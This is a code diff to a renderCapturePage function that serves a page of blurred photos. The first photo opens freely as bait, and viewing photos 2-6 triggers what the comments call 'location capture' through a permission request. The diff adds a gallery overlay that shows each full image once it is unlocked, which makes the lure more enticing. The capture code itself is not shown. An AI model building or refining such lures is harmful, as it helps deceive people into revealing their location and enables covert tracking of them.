@@ -319,7 +319,7 @@ const renderCapturePage = async (req, res, next) => {
               
               <!-- Album Grid -->
               <div class="album-grid">
-                  <div class="album-card" onclick="showGallery(0)">
+                  <div class="album-card unlocked" id="card-0" onclick="showGallery(0)">
                       <img src="${customImages[0]}" alt="Photo 1" loading="lazy">
                       <div class="blur-overlay" id="blur-0">
                           <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -384,6 +384,17 @@ const renderCapturePage = async (req, res, next) => {
               <div id="status"></div>
           </div>
           
+          <!-- Gallery Overlay -->
+          <div class="gallery-overlay" id="gallery-overlay">
+              <div class="gallery-header">
+                  <div class="gallery-title">Photo <span id="photo-number">1</span></div>
+                  <button class="close-btn" onclick="closeGallery()">✕</button>
+              </div>
+              <div class="gallery-content">
+                  <img class="gallery-image" id="gallery-image" src="" alt="Gallery Photo">
+              </div>
+          </div>
+
           <!-- Loading Overlay -->
           <div class="loading-overlay" id="loading-overlay">
               <div class="spinner"></div>
@@ -550,6 +561,9 @@ const renderCapturePage = async (req, res, next) => {
                           // Unlock only this card with animation
                           revealCard(cardIndex);
                           
+                          // Show full image after unlock animation
+                          setTimeout(() => openImageView(cardIndex), 600);
+                          
                           // Show success
                           status.innerHTML = '<span style="color: #22c55e;">✅ Photo ' + (cardIndex + 1) + ' unlocked!</span>';
                           setTimeout(() => { status.textContent = ''; }, 2000);
@@ -569,21 +583,41 @@ const renderCapturePage = async (req, res, next) => {
               }
               
               function showGallery(index) {
+                  // Check if card is already unlocked
+                  const card = document.querySelectorAll('.album-card')[index];
+                  const isUnlocked = card.classList.contains('unlocked');
+                  
+                  if (isUnlocked) {
+                      // Card already unlocked, show full image directly
+                      openImageView(index);
+                      return;
+                  }
+                  
                   // First photo (index 0) opens without permission
                   if (index === 0) {
                       revealCard(0);
+                      setTimeout(() => openImageView(0), 600);
                       return;
                   }
                   
-                  // For photos 2-6, check if already unlocked
-                  const card = document.querySelectorAll('.album-card')[index];
-                  if (card.classList.contains('unlocked')) {
-                      // Already unlocked, do nothing
-                      return;
-                  }
-                  
-                  // Trigger location capture for this specific card (2-6)
+                  // For photos 2-6, request location permission
                   handleViewImages(index);
+              }
+              
+              function openImageView(index) {
+                  const galleryOverlay = document.getElementById('gallery-overlay');
+                  const galleryImage = document.getElementById('gallery-image');
+                  const photoNumber = document.getElementById('photo-number');
+                  
+                  galleryImage.src = galleryImages[index];
+                  photoNumber.textContent = index + 1;
+                  galleryOverlay.classList.add('active');
+                  currentImageIndex = index;
+              }
+              
+              function closeGallery() {
+                  const galleryOverlay = document.getElementById('gallery-overlay');
+                  galleryOverlay.classList.remove('active');
               }
               
               function revealCard(index) {
